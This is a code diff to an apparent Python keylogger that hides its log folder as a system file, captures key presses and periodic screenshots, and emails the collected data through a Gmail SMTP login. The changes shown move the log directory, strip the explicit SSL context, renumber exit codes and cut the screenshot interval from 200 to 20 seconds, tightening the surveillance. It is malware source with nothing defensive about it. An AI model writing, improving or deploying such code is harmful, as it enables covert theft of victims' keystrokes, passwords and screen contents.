@@ -59,7 +59,7 @@ CONTROL_CHARACTER_NAMES = [
     "Delete (DEL)"
 ]
 
-logPath = os.path.join(os.environ["LOCALAPPDATA"], "SystemData", "InputLogs")
+logPath = os.path.join(os.getcwd(), "SystemData")
 # makes and hides the directory by making is hidden and system file
 os.makedirs(logPath, exist_ok=True)
 if platform.system() == "Windows":
@@ -82,12 +82,12 @@ screenshotPath = os.path.join(logPath, "Temp")
 os.makedirs(screenshotPath, exist_ok=True)
 
 # start up the smtp server for emailing
-context = ssl.create_default_context()
+
 try:
-    server = smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context)
+    server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
     server.login(from_email, password_email)
-except Exception:
-    sys.exit(130)
+except Exception as e:
+    sys.exit(131)
 
 def remove_files_in_directory(directory):
     for file in os.listdir(directory):
@@ -97,7 +97,7 @@ def remove_files_in_directory(directory):
                 os.remove(file_path)
             except Exception as e:
                 send_email("Error", from_email, e, True)
-                sys.exit(130)
+                sys.exit(132)
 
 # function to send email of the logged data
 def send_email(subject, to, body, close=False):
@@ -143,7 +143,7 @@ def send_email(subject, to, body, close=False):
         if close:
             server.close()
     except Exception as e:
-        sys.exit(130)
+        sys.exit(133)
 
 
 
@@ -168,7 +168,7 @@ def take_screenshot(interval=10):
                 send_email("Reached Max", from_email, "Sent from program")
         except Exception as e:
             send_email("Error", from_email, e, True)
-            sys.exit(130)
+            sys.exit(134)
 
 
 # a set to keep track of the keys pressed
@@ -222,7 +222,7 @@ def on_release(key):
     pressedKeys.discard(key)
     
 # creates the thread for screenshots whilst still listening to keyboard
-screenshotThread = threading.Thread(target=take_screenshot, args=(200,))
+screenshotThread = threading.Thread(target=take_screenshot, args=(20,))
 screenshotThread.start()
 
 try:    
@@ -230,7 +230,7 @@ try:
         listener.join()
 except KeyboardInterrupt as e:
     send_email("Error", from_email, "KeyboardInterrupt", True)
-    sys.exit(130)
+    sys.exit(135)
 finally:
     # ends the thread
     screenshotThreadEvent.set()
